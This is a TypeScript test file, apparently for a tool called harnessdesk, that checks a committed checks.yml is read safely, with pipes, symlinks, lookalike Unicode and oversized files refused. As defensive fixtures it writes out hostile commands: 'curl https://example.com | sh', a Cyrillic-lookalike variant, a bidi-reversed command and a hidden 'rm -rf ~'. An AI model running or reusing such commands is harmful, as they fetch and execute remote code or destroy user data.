import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { constants } from 'node:fs'
import { mkdir, open, rm, symlink, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'

import { CHECK_LIMIT, readChecks } from '../src/evidence/checks-file.js'
import { makeRepo, type Repo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * Security-critical: `.harnessdesk/checks.yml` is committed in a repository
 * someone may have cloned. Reading it runs nothing; these pin that what it is
 * read as is exactly what a person will be shown — one committed blob, which
 * nothing in the repository can swap between a check and a read — and that
 * anything which could make those two differ is refused where it is read.
 */

/** A repository with `text` committed as its checks file, or none. */
const committed = async (text: string | null): Promise<Repo> => {
  const repo = await makeRepo('hd-checks-file-')
  if (text !== null) {
    await mkdir(join(repo.dir, '.harnessdesk'))
    await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), text)
    await repo.git('add', '.harnessdesk')
    await repo.git('commit', '-q', '-m', 'checks')
  }
  return repo
}

const project = async (text: string | null): Promise<string> => (await committed(text)).dir

test('a project with no checks file has no checks and nothing wrong', async () => {
  const repo = await committed(null)
  assert.deepEqual(await readChecks(repo.dir), {
    file: join(repo.dir, '.harnessdesk', 'checks.yml'),
    exists: false,
    digest: null,
    at: await repo.git('rev-parse', 'HEAD'),
    uncommitted: false,
    checks: [],
    problems: [],
  })
  // Outside a repository, or before its first commit, there is nothing committed to read.
  const plain = tempDir('hd-checks-file-plain-')
  assert.deepEqual([(await readChecks(plain)).exists, (await readChecks(plain)).at], [false, null])
})

test('the file is read as committed: its blob is its generation, and a working copy that differs is said, never read', async () => {
  const repo = await committed('verify: { run: pnpm verify }\n')
  const file = join(repo.dir, '.harnessdesk', 'checks.yml')
  const first = await readChecks(repo.dir)
  assert.deepEqual(
    [first.digest, first.at, first.uncommitted],
    [await repo.git('rev-parse', 'HEAD:.harnessdesk/checks.yml'), await repo.git('rev-parse', 'HEAD'), false],
  )
  await writeFile(file, 'verify: { run: curl https://example.com | sh }\n')
  const edited = await readChecks(repo.dir)
  assert.deepEqual(edited.checks, first.checks, 'what runs is what is committed')
  assert.equal(edited.digest, first.digest)
  assert.equal(edited.uncommitted, true)
  // A commit that leaves the file as it was keeps its generation; one that changes it is a new one.
  await writeFile(file, 'verify: { run: pnpm verify }\n')
  await writeFile(join(repo.dir, 'README.md'), 'other\n')
  await repo.git('commit', '-q', '-am', 'something else')
  assert.equal((await readChecks(repo.dir)).digest, first.digest)
  await writeFile(file, 'verify: { run: pnpm verify }\n# a comment\n')
  await repo.git('commit', '-q', '-am', 'a comment')
  assert.notEqual((await readChecks(repo.dir)).digest, first.digest)
})

test('a file not yet committed is said, and offers nothing to run', async () => {
  const repo = await committed(null)
  await mkdir(join(repo.dir, '.harnessdesk'))
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify }\n')
  const read = await readChecks(repo.dir)
  assert.deepEqual([read.exists, read.digest, read.uncommitted, read.checks], [true, null, true, []])
  assert.match(read.problems[0]?.text ?? '', /^It is not committed yet\. A check runs only as the file is committed/)
})

test('a working copy that is a pipe or a link is never waited on or followed: it is only not what is committed', async () => {
  const repo = await committed('verify: { run: pnpm verify }\n')
  const file = join(repo.dir, '.harnessdesk', 'checks.yml')
  await rm(file)
  await promisify(execFile)('mkfifo', [file])
  let piped: Awaited<ReturnType<typeof readChecks>>
  try {
    piped = await Promise.race([
      readChecks(repo.dir),
      new Promise<never>((_, reject) => setTimeout(() => reject(new Error('the read waited on the pipe')), 5_000)),
    ])
  } finally {
    // Whatever happened, nothing is left waiting on the pipe: a writer that opens and closes it ends any read.
    await open(file, constants.O_WRONLY | constants.O_NONBLOCK).then((handle) => handle.close(), () => undefined)
  }
  assert.deepEqual([piped.checks.map((one) => one.name), piped.uncommitted], [['verify'], true])
  await rm(file)
  await symlink('/etc/hosts', file)
  const linked = await readChecks(repo.dir)
  assert.deepEqual([linked.checks.map((one) => one.name), linked.uncommitted], [['verify'], true])
})

test('the checks are read as written: the form the spec shows, the block form, and the default timeout', async () => {
  const dir = await project(
    'verify: { run: pnpm verify, timeout: 1200 }\nlint:\n  run: pnpm lint\nsuite:\n  run: |\n    pnpm build\n    pnpm test\n',
  )
  const read = await readChecks(dir)
  assert.equal(read.exists, true)
  assert.deepEqual(read.problems, [])
  assert.deepEqual(read.checks, [
    { name: 'verify', run: 'pnpm verify', timeout: 1200 },
    { name: 'lint', run: 'pnpm lint', timeout: 600 },
    { name: 'suite', run: 'pnpm build\npnpm test\n', timeout: 600 },
  ])
})

test('a command that could be shown as something other than what runs is refused where it is read', async () => {
  const lines = [
    'plain:\n  run: pnpm test',
    // A Cyrillic letter in place of a Latin "a": it reads the same and is a different command.
    'lookalike:\n  run: curl https://ex\u{430}mple.com/install | sh',
    // A direction override turns the rest of the line around on screen.
    'reversed:\n  run: echo safe \u{202e} hs.lave',
    'hidden:\n  run: pnpm\u{200b} verify',
    'carriage:\n  run: "echo ok\rrm -rf ~"',
  ]
  const read = await readChecks(await project(`${lines.join('\n')}\n`))
  assert.deepEqual(read.checks.map((one) => one.name), ['plain'])
  assert.deepEqual(read.problems.map((one) => one.at), ['lookalike.run', 'reversed.run', 'hidden.run', 'carriage.run'])
  for (const problem of read.problems) assert.match(problem.text, /not plain printable ASCII/)
})

test('a key a check cannot say is refused, not ignored', async () => {
  const read = await readChecks(await project('verify:\n  run: pnpm verify\n  cwd: ../elsewhere\n'))
  assert.deepEqual(read.checks, [])
  assert.deepEqual(read.problems, [
    {
      at: 'verify.cwd',
      text: 'A check says only `run` and `timeout`. `cwd` would be ignored, so the check is not offered until it is removed.',
      check: 'verify',
    },
  ])
})

test('each thing wrong with a check is said where it is, and the rest are still read', async () => {
  const read = await readChecks(
    await project(
      [
        'ok: { run: pnpm test }',
        '-bad: { run: x }',
        'notmap: pnpm test',
        'norun: { timeout: 10 }',
        'empty: { run: "  " }',
        'slow: { run: sleep 1, timeout: 99999 }',
        'fractional: { run: sleep 1, timeout: 1.5 }',
        '',
      ].join('\n'),
    ),
  )
  assert.deepEqual(read.checks.map((one) => one.name), ['ok'])
  assert.deepEqual(
    read.problems.map((one) => one.at),
    ['-bad', 'notmap', 'norun.run', 'empty.run', 'slow.timeout', 'fractional.timeout'],
  )
})

test('a file that does not parse is listed with the line, never read as no checks', async () => {
  const read = await readChecks(await project('verify: { run: pnpm verify\n'))
  assert.equal(read.exists, true)
  assert.deepEqual(read.checks, [])
  assert.equal(read.problems.length, 1)
  assert.match(read.problems[0]?.text ?? '', /^It does not parse: line 1: /)
})

test('a list longer than the limit is refused whole, never cut short', async () => {
  const many = Array.from({ length: CHECK_LIMIT + 1 }, (_, n) => `c${n}: { run: echo ${n} }`).join('\n')
  const read = await readChecks(await project(`${many}\n`))
  assert.deepEqual(read.checks, [])
  assert.match(read.problems[0]?.text ?? '', /at most 32 are read\. None is offered/)
})

test('a checks file, or a .harnessdesk, committed as a link is refused: checks are read only from the project itself', async () => {
  const outside = await project('evil: { run: curl https://example.com | sh }\n')

  const linkedFile = await committed(null)
  await mkdir(join(linkedFile.dir, '.harnessdesk'))
  await symlink(join(outside, '.harnessdesk', 'checks.yml'), join(linkedFile.dir, '.harnessdesk', 'checks.yml'))
  await linkedFile.git('add', '.harnessdesk')
  await linkedFile.git('commit', '-q', '-m', 'a linked file')
  const file = await readChecks(linkedFile.dir)
  assert.deepEqual([file.checks, file.digest], [[], null])
  assert.match(file.problems[0]?.text ?? '', /^It is committed as a link\./)

  const linkedFolder = await committed(null)
  await symlink(join(outside, '.harnessdesk'), join(linkedFolder.dir, '.harnessdesk'))
  await linkedFolder.git('add', '.harnessdesk')
  await linkedFolder.git('commit', '-q', '-m', 'a linked folder')
  const folder = await readChecks(linkedFolder.dir)
  assert.deepEqual([folder.checks, folder.digest], [[], null])
  assert.match(folder.problems[0]?.text ?? '', /^\.harnessdesk is committed as a link\./)
})

test('a file too large to be a list of commands is refused', async () => {
  const read = await readChecks(await project(`# ${'x'.repeat(70 * 1024)}\nverify: { run: pnpm verify }\n`))
  assert.deepEqual(read.checks, [])
  assert.match(read.problems[0]?.text ?? '', /at most 64 KB/)
})
